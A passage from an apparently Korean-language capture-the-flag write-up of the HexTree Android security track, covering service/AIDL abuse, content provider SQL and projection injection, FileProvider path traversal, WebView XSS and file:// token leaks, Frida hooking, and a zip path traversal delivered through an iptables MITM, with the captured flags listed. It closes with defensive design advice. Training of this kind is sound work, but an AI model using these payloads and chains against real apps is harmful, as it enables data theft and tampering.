Flag26은 `what=42` 전송만으로 성립하며 바인딩 상대를 검사하지 않습니다. Flag27은 3단계 구성이지만
서비스가 비밀번호를 직접 회신합니다.

```
what=1 (MSG_ECHO)         data{echo:"give flag"}   → 서비스가 echo 저장
what=2 (MSG_GET_PASSWORD) obj != null, replyTo=공격 앱 → 서비스가 password 회신
what=3 (MSG_GET_FLAG)     data{password:<수신 값>}  → 성공
```

### 8.3 AIDL 직접 트랜잭션 (Flag 28–29)

AIDL 스텁을 공격 앱에 포함할 필요가 없습니다. 필요한 것은 **DESCRIPTOR 문자열**과 **트랜잭션 번호**
(선언 순서대로 1, 2, 3…)입니다.

```java
Parcel d = Parcel.obtain(), r = Parcel.obtain();
d.writeInterfaceToken("io.hextree.attacksurface.services.IFlag28Interface");
binder.transact(1, d, r, 0);        // openFlag()
r.readException();
```

### 8.4 패키지 가시성으로 인한 무증상 실패

`bindService()`가 예외 없이 false만 반환하는 현상이 발생했습니다. 원인은 Android 11(API 30)의 패키지
가시성 정책이었습니다.

```xml
<queries>
    <package android:name="io.hextree.attacksurface" />
</queries>
```

명시적 `startActivity`는 가시성 선언 없이 동작하지만 `bindService`, `ContentResolver`,
`queryIntentActivities`는 차단됩니다. 피해 앱 역시 동일한 이유로 `<queries>`에 자체 액션을 선언하고
있었습니다.

| # | 이름 | 취약 원인 | 해결 방법 | 플래그 |
|---|---|---|---|---|
| 24 | Basic service | `exported=true` 서비스 | `am start-service -a …START_FLAG24_SERVICE` | `HXT{basic-service-ha98sl}` |
| 25 | Multi-step service | 상태를 서비스 인스턴스에 보관 | UNLOCK1→2→3 순차 호출 | `HXT{only-one-running-service-1hasu}` |
| 26 | Messenger service | 바인더 호출자 검증 없음 | `bindService` 후 `Message(what=42)` | `HXT{message-say-whaaaat-aug2is}` |
| 27 | Messenger protocol | 비밀번호를 클라이언트에 회신 | echo → get password → get flag | `HXT{service-messages-js71h}` |
| 28 | AIDL service | AIDL 메서드에 권한 검사 없음 | 스텁 없이 `Binder.transact(1)` | `HXT{bound-aidl-service-sdf2ds}` |
| 29 | AIDL auth service | `init()`이 비밀번호 반환 | init → authenticate → success | `HXT{ai-ai-aidl-service-a2si1}` |

---

## 9. Course 7 — Content- and FileProvider

provider는 모든 쿼리 인자가 외부 입력이며, FileProvider는 설정 자체가 노출 범위를 결정합니다.

### 9.1 selection과 projection (Flag 30–33)

`query(uri, projection, selection, selectionArgs, sortOrder)`의 인자는 전부 외부 입력입니다.
Flag32는 selection을 문자열로 연결합니다.

```java
String where = "visible=1" + (selection != null ? " AND (" + selection + ")" : "");
```

괄호를 맞춰 닫으면 조건이 무력화됩니다.

```bash
adb shell "content query --uri content://io.hextree.flag32/flags --where \"1=1) OR (1=1\""
Row: 2 _id=3, name=flag32, value=HXT{sql-injection-in-provider-1gs82}, visible=0
```

Flag33은 provider가 `exported=false`임에도, 앱이 URI를 담은 인텐트에
`FLAG_GRANT_READ_URI_PERMISSION`을 부여해 결과로 반환하거나 암시적 인텐트로 배포합니다. 권한이
인텐트를 통해 전파되는 구조입니다. 다만 해당 URI로 조회해도 플래그는 `Note` 테이블에 있고
`UriMatcher`가 접근을 차단합니다.

selection이 차단된 상태에서 확인한 결과 projection은 검증되지 않았습니다. 컬럼 위치에 서브쿼리를
삽입해 우회했습니다.

```java
getContentResolver().query(uri, new String[]{
        "(SELECT title   FROM Note WHERE title='flag33') AS name",
        "(SELECT content FROM Note WHERE title='flag33') AS value"
}, null, null, null);
```

selection만 통제하고 projection을 누락하는 형태는 실무에서도 흔합니다. `SQLiteQueryBuilder`의
`setProjectionMap()`으로 컬럼 화이트리스트를 강제해야 합니다.

### 9.2 FileProvider 설정과 노출 범위 (Flag 34–36)

Flag34는 파일명을 검증하지 않고 쓰기 권한(flags=3)까지 부여합니다. 3단계 체인이 성립합니다.

1. `filename="flag34.txt"`로 URI를 받아 공격 앱이 파일을 생성(존재 조건 충족)
2. 재요청 시 앱이 `files/flags/flag34.txt`에 플래그를 기록
3. `filename="flags/flag34.txt"`로 URI를 받아 읽기

Flag35는 설정 범위가 더 넓습니다.

```xml
<!-- res/xml/rootpaths.xml -->
<paths><root-path name="root_files" path="/" /></paths>
```

파일시스템 루트를 노출하므로 `../flag35.txt`만으로 앱 데이터 디렉터리에 접근됩니다. 이 쓰기 권한은
Flag36으로 이어집니다. 앱이 자체 설정 파일을 신뢰하기 때문입니다.

```java
askFile(a, "Flag35Activity", "../shared_prefs/Flag36Preferences.xml", RQ_36_PREFS);
write(a, uri, "<?xml version='1.0' ...?>\n<map>\n    <boolean name=\"solved\" value=\"true\" />\n</map>\n");
```

SharedPreferences는 메모리에 캐시되므로 반영을 위해 프로세스 재시작이 필요합니다.

### 9.3 악성 provider의 메타데이터 (Flag 37)

Flag37Activity는 전달받은 `content://` URI를 조회해 `_display_name`과 `_size`를 신뢰합니다.

```java
if ("../flag37.txt".equals(displayName) && size == 1337) {
    if ("give flag".equals(readAll(openInputStream(uri)))) success();
}
```

공격 앱의 provider가 원하는 값을 보고하면 조건이 충족됩니다. 외부 앱이 제공한 URI의 파일명, 크기,
MIME 타입은 모두 위조 가능하므로, 저장 시 `getCanonicalPath()`로 정규화해 기대 디렉터리 내부인지
확인해야 합니다.

<p align="center"><img src="/assets/img/hextree-android-track/flag32.png" alt="Flag 32" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag33_1.png" alt="Flag 33" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag35.png" alt="Flag 35" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag37.png" alt="Flag 37" width="170" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em><strong>32</strong> selection SQL injection · <strong>33</strong> URI 권한 + projection 주입 · <strong>35</strong> <code>root-path</code> 트래버설 · <strong>37</strong> 가짜 메타데이터 provider</em></p>

| # | 이름 | 취약 원인 | 해결 방법 | 플래그 |
|---|---|---|---|---|
| 30 | Basic provider | `exported=true` provider | `content query --uri content://io.hextree.flag30/success` | `HXT{query-provider-table-1vsd8}` |
| 31 | UriMatcher | 경로만으로 인가 판단 | `content://io.hextree.flag31/flag/31` | `HXT{query-uri-matcher-sakj1}` |
| 32 | SQL injection | selection 문자열 연결 | `--where "1=1) OR (1=1"` | `HXT{sql-injection-in-provider-1gs82}` |
| 33.1 | Return provider access | URI 권한을 결과로 반환 | 결과 URI + projection SQLi | `HXT{union-select-injection-1bs98}` |
| 33.2 | Implicit provider access | URI 권한을 암시적 인텐트로 유출 | 인텐트 수신 → 동일 SQLi | `HXT{union-select-injection-1bs98}` |
| 34 | Simple File Provider | 파일명 미검증 + 쓰기 권한 | 생성 → 앱이 기록 → 경로 변경 후 읽기 | `HXT{sharing-filedescriptors-av27s}` |
| 35 | Root-File Provider | `<root-path path="/">` | `../flag35.txt` 트래버설 | `HXT{path-traversal-stealer-s1hw9}` |
| 36 | Overwriting Shared Prefs | 자체 설정 파일 신뢰 | `../shared_prefs/…xml`을 `solved=true`로 덮어쓰기 | `HXT{overwriting-shared-prefs-034nsd}` |
| 37 | Filename Traversal | 외부 provider 메타데이터 신뢰 | 위조된 `_display_name`/`_size`/내용 | `HXT{file-name-query-187xh}` |

---

## 10. Course 8 — WebViews and CustomTabs

앱 내 브라우저는 웹 취약점과 앱 취약점이 결합되는 지점입니다.

### 10.1 JS 브리지와 로드 URL (Flag 38–39)

```java
String url = getIntent().getStringExtra("URL");            // 외부 입력
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new JsObject(), "hextree"); // JS → 네이티브
webView.loadUrl(url);
```

로드 대상을 지정할 수 있으므로 자바스크립트 한 줄로 브리지가 호출됩니다.

```bash
adb shell am start -n $W.Flag38WebViewsActivity \
  -e URL 'data:text/html,<script>hextree.success(true)</script>'
```

Flag39는 URL이 고정된 대신 extra가 페이지로 전달됩니다. 앱은 JSON으로 직렬화하지만 웹 측에서
`innerHTML`에 그대로 삽입합니다.

```javascript
function initApp(obj) { window.hello_name.innerHTML = `Hello <b>${obj.name}</b>`; }
```

전형적인 DOM XSS이며 `<img src=x onerror=hextree.success()>`로 성립합니다.

### 10.2 file:// 유니버설 액세스 (Flag 40)

```java
settings.setAllowUniversalAccessFromFileURLs(true);   // file:// 페이지가 임의 출처 접근
Utils.writeFile(this, "token.txt", UUID.randomUUID().toString());
webView.loadUrl(getIntent().getStringExtra("URL"));
```

공격 앱의 파일은 피해 앱이 읽지 못하므로, 9.2절에서 확보한 쓰기 권한으로 피해 앱의 `files/`에
익스플로잇 HTML을 배치하고 해당 경로를 로드시켰습니다.

```html
<script>
var x = new XMLHttpRequest();
x.open('GET','file:///data/data/io.hextree.attacksurface/files/token.txt');
x.onload = function(){ hextree.authCallback(x.responseText); };
x.send();
</script>
```

FileProvider 오설정 → 앱 내부 임의 파일 배치 → 과도한 WebView 설정 → 내부 비밀 유출로 이어지는
체인이며, 세 요소 중 하나만 차단해도 성립하지 않습니다.

### 10.3 CustomTabs PostMessage의 origin 혼동 (Flag 41)

CustomTabs는 Chrome이 페이지를 렌더링하므로 앱이 DOM에 접근할 수 없고, PostMessage 채널로
통신합니다.

```java
String url = getIntent().getStringExtra("URL");        // 외부 입력
session.validateRelationship(RELATION_USE_AS_ORIGIN, Uri.parse("https://oak.hackstree.io/"), null);
// onNavigationEvent(2 = NAVIGATION_FINISHED) 시점에 validated면
session.requestPostMessageChannel(Uri.parse("https://oak.hackstree.io/"));
```

`onPostMessage`는 jadx 디컴파일이 실패해 smali로 확인했습니다. `init_complete` 이후 `success` 메시지
하나로 조건이 충족되며, 정상 사이트는 해당 메시지를 전송하지 않습니다.

핵심은 **Digital Asset Links 검증이 앱과 도메인의 관계만 증명한다**는 점입니다. 채널이 실제로
연결되는 대상은 그 시점에 탭에 로드된 페이지이므로, 로드 URL이 외부 입력이면 "검증된 origin"이라는
전제가 성립하지 않습니다.

```javascript
window.addEventListener("message", function (event) {
    if (!event.ports || event.ports.length === 0) return;
    window.port = event.ports[0];
    window.port.onmessage = function (e) {
        if (e.data === "init") {
            window.port.postMessage(JSON.stringify({ message: 'init_complete' }));
            window.port.postMessage(JSON.stringify({ message: 'success' }));   // 정상 사이트는 미전송
        }
    };
});
```

재현에는 타이밍 제약이 있었습니다. 자동으로 열리는 첫 로딩은 DAL 검증보다 빨라
`requestPostMessageChannel`이 호출되지 않고, 탭을 닫으면 액티비티가 `finish()`됩니다. 페이지가 스스로
재이동하도록 구성해 검증 완료 이후의 navigation 이벤트를 생성하는 방식으로 해결했습니다.

<p align="center"><img src="/assets/img/hextree-android-track/flag38.png" alt="Flag 38" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag39.png" alt="Flag 39" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag40.png" alt="Flag 40" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag41.png" alt="Flag 41" width="170" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em><strong>38</strong> data: URL의 JS가 브리지 호출 · <strong>39</strong> innerHTML DOM XSS · <strong>40</strong> file:// 유니버설 액세스로 토큰 유출 · <strong>41</strong> PostMessage 하이재킹</em></p>

| # | 이름 | 취약 원인 | 해결 방법 | 플래그 |
|---|---|---|---|---|
| 38 | @JavascriptInterface | exported WebView + `URL` extra | `data:text/html,<script>hextree.success(true)</script>` | `HXT{call-from-js-1vsa91b}` |
| 39 | WebView XSS | `innerHTML` 템플릿 삽입 | `<img src=x onerror=hextree.success()>` | `HXT{webview-xss-1hsa1njs}` |
| 40 | Leak via file:// | `setAllowUniversalAccessFromFileURLs(true)` | Flag35로 exploit.html 배치 → XHR로 token.txt 유출 | `HXT{leak-fileprovider-1gash2}` |
| 41 | CustomTabs PostMessage | 채널이 현재 로드된 페이지와 연결 | 로컬 서버 페이지에서 `{"message":"success"}` | `HXT{post-message-origin-h19sba3}` |

---

## 11. Course 9 — Dynamic Instrumentation

파일을 수정하지 않고 실행 중인 앱을 조작하는 코스입니다. 필요한 API는 세 가지로 정리됩니다.

| 목적 | API |
|---|---|
| 클래스 핸들 | `Java.use('pkg.Class')` |
| 새 인스턴스 / 힙의 기존 인스턴스 | `Cls.$new(...)` / `Java.choose(...)` |
| 메서드 후킹 · 필드 조작 | `Cls.m.implementation = …` / `inst.field.value = 42` |

```
$ python frida-scripts/run.py frida-scripts/fridatarget-flags.js -n FridaTarget
[static]   HXT{a-static-calling-with-frida}
[instance] HXT{dynamic-droid}
[sesame]   HXT{the-droid-youre-looking-for}
```

3절의 첫 챌린지도 동일한 방식으로 해결됩니다. `FlagActivity`는 SeekBar 값이 42일 때 조건이
충족되는데, 힙의 인스턴스를 획득해 필드를 설정하고 복호 메서드를 직접 호출하면 UI 조작이 불필요합니다.

```javascript
Java.choose('io.hextree.flagproject.FlagActivity', {
    onMatch: function (inst) {
        inst.progressTracking.value = 42;
        console.log('[FLAG] ' + inst.decryptFlag());
    }, onComplete: function () {}
});
```

5.3절에서 언급한 네이티브 라이브러리 로드는 Frida 컨텍스트에서 직접 수행할 경우 실패합니다.

```javascript
System.loadLibrary('native-lib');        // UnsatisfiedLinkError: library not found
System.load(dir + '/libnative-lib.so');  // NullPointerException (호출자 ClassLoader 부재)

// 해결: 앱 자신의 메서드를 호출하면 앱 클래스로더로 로드됩니다
Java.use('io.hextree.weatherusa.InternetUtil').a(url, 'HextreeForecastUSA/v4.x');
```

| # | 과제 | 해결 방법 | 플래그 |
|---|---|---|---|
| 108 | 정적 메서드 | `Java.use(...).flagFromStaticMethod()` | `HXT{a-static-calling-with-frida}` |
| 109 | 인스턴스 메서드 | `Cls.$new().flagFromInstanceMethod()` | `HXT{dynamic-droid}` |
| 110 | 매직 워드 | `flagIfYouCallMeWithSesame("sesame")` | `HXT{the-droid-youre-looking-for}` |

---

## 12. Course 10 — Network Interception

앱이 네트워크에서 수신한 데이터를 얼마나 신뢰하는지 확인하는 코스입니다. 대상은 지도 앱
`io.hextree.pocketmaps`입니다.

### 12.1 평문 HTTP 트래픽 (Flag 64)

지도 서버 주소가 설정 클래스에 평문 HTTP로 지정되어 있습니다.

```java
private String s = "http://storage.googleapis.com/ht-labs-dev-static-files/pocketmaps/maps";
//                  ↑ https가 아닙니다
```

목록 JSON 자체에 플래그가 포함되어 있어 평문 트래픽 확인만으로 취득됩니다. 코스는
`emulator -tcpdump packets.cap` 후 Wireshark 분석을 안내하며 결과는 동일합니다.

### 12.2 zip path traversal (Flag 65)

앱에는 압축 해제 코드가 두 벌 존재합니다. graphhopper의 `Unzipper`는 `getCanonicalPath()`로 검증하는
안전한 구현이지만, 실제 사용되는 코드는 경로를 문자열로 연결합니다.

```java
File dir = new File(l.A().o(), name + "-gh");
for (ZipEntry e = zis.getNextEntry(); e != null; e = zis.getNextEntry()) {
    String path = dir.getAbsolutePath() + File.separator + e.getName();   // 검증 없음
    // ... new FileOutputStream(path) ...
}
```

문제는 트래픽 가로채기였습니다. 이 앱은 에뮬레이터 전역 프록시 설정을 사용하지 않고,
`/system/etc/hosts` 조작도 netd 캐시로 인해 적용되지 않았습니다. root 권한의 iptables DNAT가 유효한
방법이었습니다.

```bash
adb shell iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 10.0.2.2:8080
python tools/fake_map_server.py      # 목록 JSON + 트래버설 엔트리를 포함한 .ghz 서빙
```

지도 파일은 앱이 아니라 DownloadManager, 즉 시스템 프로세스가 수신합니다. 프록시 설정이 적용되지
않은 이유이며, OUTPUT 체인 DNAT는 해당 트래픽까지 포함합니다. 결과적으로 지정 폴더 외부에 파일이
생성되었습니다.

```
$ adb shell cat …/pocketmaps/downloads/hax
pwned by MITM zip path traversal
```

앱은 이 파일을 감지하면 난독화된 플래그를 Toast로 1회 표시합니다. 표시 시간이 짧아 Frida로
`Toast.makeText`를 후킹해 취득했습니다.

<p align="center"><img src="/assets/img/hextree-android-track/net07_after.png" alt="가짜 지도 목록" width="260" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>공격자 서버가 제공한 목록만 표시 — 앱이 트래픽을 전적으로 신뢰</em></p>

| # | 이름 | 취약 원인 | 해결 방법 | 플래그 |
|---|---|---|---|---|
| 64 | 평문 HTTP 트래픽 | 지도 목록·파일을 `http://`로 수신 | 목록 JSON 내 `hextree-flag` | `HXT{cleartext-traffic-g19g2is}` |
| 65 | zip path traversal | 압축 해제 시 엔트리 경로 미검증 | iptables DNAT MITM → `../../downloads/hax` 엔트리 | `HXT{zip-path-traversal-1sg17}` |

---

## 13. 이론 중심 코스

네 개 코스는 실습 랩 없이 개념과 방법론을 다룹니다. 앞선 실습의 배경이 되는 내용이라 함께
이수했습니다.

| 코스 | 내용 |
|---|---|
| Android Permissions | 권한 모델, 보호 수준(normal/dangerous/signature), 런타임 권한 |
| Android (Insecure) Storage | 내부·외부 저장소 차이, SharedPreferences·SQLite 평문 저장, 백업 플래그 |
| Android Bug Bounty | 리포트 작성 기준과 스코프 판단 |
| Bluetooth RE Basics | BLE 광고·GATT 구조와 스니핑 기초(하드웨어 필요) |

---

## 14. 환경 이슈 정리

재현 과정에서 "코드는 정상이나 동작하지 않는" 상황이 반복되었습니다. 대부분 플랫폼 정책에 기인하며,
실무 진단에서도 오탐·미탐의 원인이 되는 지점입니다.

| 증상 | 원인 | 해결 |
|---|---|---|
| `exported=false`인데 adb로 실행됨 | shell이 `START_ANY_ACTIVITY` 보유 | 영향도 평가는 권한 없는 PoC 앱으로 |
| `bindService()`가 무증상 실패 | Android 11 패키지 가시성 | `<queries>` 선언 |
| 매니페스트 리시버가 브로드캐스트 미수신 | Android 8+ 암시적 브로드캐스트 제한 | `registerReceiver()` 동적 등록 |
| 재설치·force-stop 후 리시버 무반응 | 패키지가 *stopped* 상태 | 앱을 1회 실행해 해제 |
| 두 번째 `am start`가 `onCreate` 미호출 | 동일 인텐트 + 기존 태스크 재사용 | `--activity-clear-task` + nonce extra |
| 액티비티 미표시 | 에뮬레이터 화면 잠김 | `input keyevent KEYCODE_WAKEUP` + `wm dismiss-keyguard` |
| 서비스·리시버가 띄우는 화면 미표시 | 백그라운드 액티비티 시작 제한 | 피해 앱을 포그라운드 유지 |
| `setResult` 후 결과 미수신 | 액티비티가 `finish()` 미호출 | `input keyevent KEYCODE_BACK` |
| `frida -U -l script.js` 즉시 종료 | frida-tools 14.8.1 ↔ frida-core 16.7.19 불일치 | Python `frida` 모듈로 직접 실행 |
| protected broadcast 전송 거부 | `APPWIDGET_UPDATE` 등 시스템 전용 | 앱이 부분 문자열 검사 시 임의 액션명으로 우회 |
| 앱이 프록시 설정 무시 | 자체 HTTP 스택 / DownloadManager | iptables DNAT 또는 `emulator -tcpdump` |

---

## 15. 방어 설계

확인된 공격 패턴을 방어 관점으로 정리하면 다음과 같습니다.

| # | 대응 | 근거 |
|---|---|---|
| 1 | `exported=false`를 기본값으로 두고, 공개가 필요하면 `android:permission`(가능하면 `signature`) 지정 | 진입점 자체를 축소 |
| 2 | 민감 데이터는 명시적 인텐트로만 전달 | 암시적 인텐트·ordered broadcast·알림 PendingIntent는 제3자가 수신 가능 |
| 3 | 수신한 Intent·Bundle·URI·파일명을 신뢰 불가 입력으로 처리, 중첩 Intent를 그대로 실행하지 않음 | Intent Redirect 차단 |
| 4 | `PendingIntent`는 `FLAG_IMMUTABLE` 기본, base intent는 명시적으로 구성 | `fillIn`을 통한 컴포넌트·extra 주입 방지 |
| 5 | Provider는 placeholder 쿼리와 projection map으로 컬럼·조건 통제, `grantUriPermissions` 범위 최소화 | selection·projection 양쪽 주입 차단 |
| 6 | FileProvider는 필요한 서브디렉터리만 노출, 파일명은 `getCanonicalPath()`로 정규화 | 경로 트래버설 차단 |
| 7 | 권한·역할 판정은 서버에서 수행 | 클라이언트 조건 검사와 SharedPreferences는 위조 가능 |
| 8 | WebView는 JS 브리지 최소화, 로드 URL 화이트리스트, `setAllowUniversalAccessFromFileURLs` 비활성화 | 브리지 호출·내부 파일 접근 차단 |
| 9 | 리소스·업데이트는 HTTPS 수신 + 무결성 검증, 압축 해제 시 경로 검증 | MITM 및 zip path traversal 차단 |

---

## 16. 정리

문제는 코스별로 분산되어 있었으나 원인은 네 가지 패턴으로 수렴합니다.

| 패턴 | 해당 사례 |
|---|---|
| 문자열로 신원·출처를 판단 | `getCallingActivity().getClassName().contains(...)`, `com.android.browser.application_id`, `action.contains(...)` |
| 비밀을 제3자가 수신 가능한 채널에 탑재 | 암시적 인텐트, ordered broadcast, 알림 PendingIntent |
| 외부 입력을 실행하거나 권한을 위임 | Intent Redirect, `FLAG_MUTABLE` PendingIntent, URI 권한 전파 |
| 클라이언트 보관 상태를 신뢰 | SharedPreferences, 네이티브에 은닉한 키, URL 파라미터의 역할 값 |

각 패턴은 단독으로도 리포트 대상이지만, 체인으로 결합될 때 영향도가 크게 상승합니다. 쓰기 가능한
`root-path` FileProvider는 그 자체로 임의 파일 읽기·쓰기이며, 과도한 WebView 설정이 결합되면 내부
토큰 유출, SharedPreferences 신뢰가 결합되면 권한 상승으로 확장됩니다. 본문의 Flag 35 → 36 → 40이
해당 경로입니다.

| 구분 | 내용 |
|---|---|
| 분석 범위 | Intent·BroadcastReceiver·Service/Binder·ContentProvider/FileProvider·WebView/CustomTabs, 앱 리버싱·동적 계측·네트워크 인터셉션 |
| 결과 | 트랙이 제시한 문제 전부 해결 및 제출 완료 |
| 주요 체인 | ① Intent Redirect → 비공개 컴포넌트 + URI 권한 ② root FileProvider 쓰기 → SharedPreferences 위조 ③ FileProvider 쓰기 → WebView file:// → 내부 토큰 유출 |
| 재현 도구 | 공격 앱 `io.hextree.poc`, Frida 러너, 미니 MITM 프록시·가짜 지도 서버, UI 자동화 스크립트 |
| 검증 | 앱이 기록하는 solved 상태와 플랫폼 제출 기록 양쪽에서 확인 |

<p align="center"><img src="/assets/img/hextree-android-track/platform_map_complete.png" alt="HexTree Android 트랙 완료 화면" width="720" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>트랙 완료 시점의 헥스맵 — 코스 헥사곤 전체가 완료 표시</em></p>

## References

- HexTree Android Track — <https://app.hextree.io/map/android>
- `hextreeio/android-challenge1` — 첫 챌린지 소스(매니페스트 해시 기반 무결성 검증)
- `hextreeio/android-poc-app` — 공격 앱 템플릿
- `hextreeio/android-webview-research` — WebView/CustomTabs 실험 앱
- Android Developers — [Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters),
  [Package visibility](https://developer.android.com/training/package-visibility),
  [FileProvider](https://developer.android.com/reference/androidx/core/content/FileProvider),
  [PendingIntent](https://developer.android.com/reference/android/app/PendingIntent)
- Frida — <https://frida.re/docs/javascript-api/>
